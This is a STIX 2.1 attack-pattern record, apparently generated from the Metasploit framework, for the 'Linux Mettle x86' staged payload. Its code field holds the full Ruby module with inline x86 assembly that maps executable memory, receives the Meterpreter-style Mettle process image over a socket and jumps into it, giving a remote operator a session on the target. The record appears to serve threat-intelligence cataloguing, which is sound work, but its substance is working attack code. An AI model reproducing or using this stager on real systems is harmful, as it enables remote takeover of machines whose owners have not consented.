{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f77e7da-553e-4b52-966a-b74f447ce74d",
    "created": "2024-08-14T16:33:19.26537Z",
    "modified": "2024-08-14T16:33:19.265374Z",
    "name": "Linux Mettle x86",
    "description": "Inject the mettle server payload (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/linux/x86/meterpreter.rb",
            "external_id": "meterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/elfparsey'\n\nmodule MetasploitModule\n  include Msf::Sessions::MeterpreterOptions\n  include Msf::Sessions::MettleConfig\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'Linux Mettle x86',\n        'Description' => 'Inject the mettle server payload (staged)',\n        'Author'      => [\n          'William Webb <william_webb[at]rapid7.com>'\n        ],\n        'Platform'    => 'Linux',\n        'Arch'        => ARCH_X86,\n        'License'     => MSF_LICENSE,\n        'Session'     => Msf::Sessions::Meterpreter_x86_Linux\n      )\n    )\n  end\n\n  def elf_ep(payload)\n    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))\n    elf.elf_header.e_entry\n  end\n\n  def asm_intermediate_stage(payload)\n    entry_offset = elf_ep(payload)\n\n    %(\n      push edi                    ; save sockfd\n      xor ebx, ebx                ; address\n      mov ecx, #{payload.length}  ; length\n      mov edx, 7                  ; PROT_READ | PROT_WRITE | PROT_EXECUTE\n      mov esi, 34                 ; MAP_PRIVATE | MAP_ANONYMOUS\n      xor edi, edi                ; fd\n      xor ebp, ebp                ; pgoffset\n      mov eax, 192                ; mmap2\n      int 0x80                    ; syscall\n\n      ; receive mettle process image\n      mov edx, eax                ; save buf addr for next code block\n      pop ebx                     ; sockfd\n      push 0x00000100             ; MSG_WAITALL\n      push #{payload.length}      ; size\n      push eax                    ; buf\n      push ebx                    ; sockfd\n      mov ecx, esp                ; arg array\n      mov ebx, 10                 ; SYS_READ\n      mov eax, 102                ; sys_socketcall\n      int 0x80                    ; syscall\n\n      ; setup stack\n      pop edi\n      xor ebx, ebx\n      and esp, 0xfffffff0         ; align esp\n      add esp, 40\n      mov eax, 109\n      push eax\n      mov esi, esp\n      push ebx                    ; NULL\n      push ebx                    ; AT_NULL\n      push edx                    ; mmap buffer\n      mov eax, 7\n      push eax                    ; AT_BASE\n      push ebx                    ; end of ENV\n      push ebx                    ; NULL\n      push edi                    ; sockfd\n      push esi                    ; m\n      mov eax, 2\n      push eax                    ; argc\n\n      ; down the rabbit hole\n      mov eax, #{entry_offset}\n      add edx, eax\n      jmp edx\n    )\n  end\n\n  def generate_intermediate_stage(payload)\n    Metasm::Shellcode.assemble(Metasm::X86.new, asm_intermediate_stage(payload)).encode_string\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    midstager = generate_intermediate_stage(payload)\n    vprint_status(\"Transmitting intermediate stager...(#{midstager.length} bytes)\")\n    conn.put(midstager) == midstager.length\n  end\n\n  def generate_stage(opts = {})\n    config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))\n    MetasploitPayloads::Mettle.new('i486-linux-musl',\n      generate_config(opts.merge(config_opts))).to_binary :process_image\n  end\nend\n",
    "x_mitre_platforms": [
        "Linux'"
    ]
}